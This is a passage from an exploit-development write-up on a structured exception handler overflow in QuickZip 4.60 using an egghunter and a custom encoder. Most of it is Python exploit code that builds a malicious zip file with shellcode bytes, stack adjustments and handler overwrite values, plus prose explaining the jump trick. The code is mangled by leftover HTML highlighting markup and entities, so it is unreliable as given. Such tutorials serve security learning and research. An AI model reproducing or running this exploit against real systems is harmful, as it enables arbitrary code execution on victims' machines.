class="n">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Length</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">exploit</span> <span class="o">=</span> <span class="n">header_1</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_2</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_3</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">mefile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">cst</span><span class="o">.</span><span class="n">zip</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">w</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Exploit</span> <span class="n">complete</span><span class="err">!</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>And that&rsquo;s how it looks after execution:</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/21.written%20instructions.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/21.written%20instructions.png" alt="image" /></a></p>

<p>Fantastic, we have successfully written code that we want using only valid characters! All that&rsquo;s left to do now is to jump back to that area to get it executed. We&rsquo;ll also need to change our temporary <code>0xDEADBEEF</code> address that we have written to the actual offset once we know what it is&hellip; but that&rsquo;s at the end.</p>

<h2>Jumping around</h2>

<p>Unfortunately we don&rsquo;t have much space to jump around. Only <strong>5</strong> bytes after our custom encoder code and <strong>4</strong> bytes before the encoder code. We need to come up with instructions that will get us to the code we have just written.</p>

<p>Turns out, there&rsquo;s actually not much that we can do due to the character restriction. Any short backward jumps contain invalid characters and don&rsquo;t get us where we need to be. Also, if we were to reuse the jump we took before&hellip; hang on&hellip; the jump we used before&hellip;. hmmmm.</p>

<p>Have a look at the payload we currently have.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/21.written%20instructions.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/21.written%20instructions.png" alt="image" /></a></p>

<p>We need to get creative. Let&rsquo;s reuse the <code>JNO</code> jump back we already have in our SEH to put us back again in the area we control. At the very beginning of the encoder payload that we currently have, we&rsquo;ll add some NOPs that will be then overwritten with another jump back instruction by our custom encoder to put us before the code we have just recently written.</p>

<p>Phew, hope it makes sense? Let me explain.</p>

<p>The jump we&rsquo;ll need to use will be simply <code>JMP $-16</code> (<code>\xeb\xee</code>), unfortunately it contains invalid characters and it won&rsquo;t work for us&hellip;. any jump with valid characters will put us too far &lsquo;up&rsquo;.</p>

<p>However! We can write it using the encoder we already have, exactly the same way we&rsquo;ve done it for putting address of egghunter to <code>EAX</code> - we&rsquo;ll just need to adjust our offsets and modify code a little bit.</p>

<p>First of all, instead of those few NOPs that we were writing using our encoder, we&rsquo;ll add our <code>JMP</code> instruction. Secondly, we&rsquo;ll need to modify our initial stack adjustment to land exactly where the SEH jump will initialy take us. Lastly, we&rsquo;ll add some NOPs that will be overwritten at the very beginning of the encoder. A lot to take in, but let&rsquo;s see how it works in action - hopefully it&rsquo;ll be clearer.</p>

<p>Let&rsquo;s start with NOPs before our custom encoder. Since we need to use valid character set, we can use <code>\x41\x41</code> (<code>INC ECX</code>) as our NOPs.</p>

<p>Next, stack adjustment. Looking at current state, it appears that we&rsquo;ll need to offset it <strong>6</strong> bytes further to start writing into the area we want to overwrite. Let&rsquo;s make that change as well.</p>

<p>Lastly, we&rsquo;ll need to write the <code>JNZ $-16</code> (<code>\x75\xee</code>) instruction with our encoder. Let&rsquo;s just replace last two <code>\x90</code> with the new instruction (remembering about little-endianness and that we need to write it in reverse).</p>

<p>Putting it all together, the changes should look like this:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;&amp;</span><span class="n">hellip</span><span class="p">;</span><span class="n">snip</span><span class="o">&amp;</span><span class="n">hellip</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">nseh_offset</span> <span class="o">=</span> <span class="mi">292</span>
</span><span class='line'><span class="n">jump_offset</span> <span class="o">=</span> <span class="mi">92</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;&amp;</span><span class="n">hellip</span><span class="p">;</span><span class="n">snip</span><span class="o">&amp;</span><span class="n">hellip</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">=</span> <span class="n">egghunter</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">nseh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">-</span> <span class="n">jump_offset</span><span class="p">)</span>    <span class="c"># padding for nSEH&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x41</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># INC ECX (acts as NOPs, but using valid character set)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Offset</span> <span class="n">the</span> <span class="n">stack</span> <span class="n">by</span> <span class="mh">0x632</span> <span class="n">to</span> <span class="n">start</span> <span class="n">writing</span> <span class="n">to</span> <span class="n">a</span> <span class="n">controlled</span> <span class="n">area</span> <span class="n">of</span> <span class="n">memory</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x54</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push esp;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x58</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># pop eax;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x33</span>\<span class="n">x07</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x01010733</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x2d</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># sub eax, 0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x5c</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># pop esp;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Write</span> <span class="n">instructions</span> <span class="k">for</span><span class="p">:</span> <span class="n">push</span> <span class="n">esp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">eax</span><span class="p">;</span> <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0xDEADBEEF</span><span class="p">;</span> <span class="n">jmp</span> <span class="n">eax</span><span class="p">;</span> <span class="n">jnz</span> <span class="mh">0xee</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0xee7590e0 into EAX  ==&gt;&gt; &amp;lsquo;0xee75&amp;rsquo; represents &amp;lsquo;JNZ $-16&amp;rsquo; instruction</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x70</span>\<span class="n">x70</span>\<span class="n">x74</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77747070</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x70</span>\<span class="n">x20</span>\<span class="n">x01</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77012070</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0xffdeadbe into EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x77</span>\<span class="n">x77</span>\<span class="n">x77</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77777777</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x37</span>\<span class="n">x25</span>\<span class="n">x57</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77572537</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x10</span>\<span class="n">x11</span>\<span class="n">x10</span>\<span class="n">x11</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x11101110</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0xef2d5854 into EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x43</span>\<span class="n">x47</span>\<span class="n">x1c</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x771c4743</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x01</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77011010</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x10</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x01100101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">nseh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>       <span class="c"># padding for the rest of the encoder&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x71</span>\<span class="n">x9b</span>\<span class="n">x70</span>\<span class="n">x9b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>       <span class="c"># nSEH: jno $-99; jo $-99   =&gt; &amp;lsquo;9b&amp;rsquo; will actually be converted to &amp;lsquo;a2&amp;rsquo;, which is $-92</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x33</span>\<span class="n">x28</span>\<span class="n">x42</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>       <span class="c"># SEH&lt;/p&gt;</span>
</span><span class='line'>
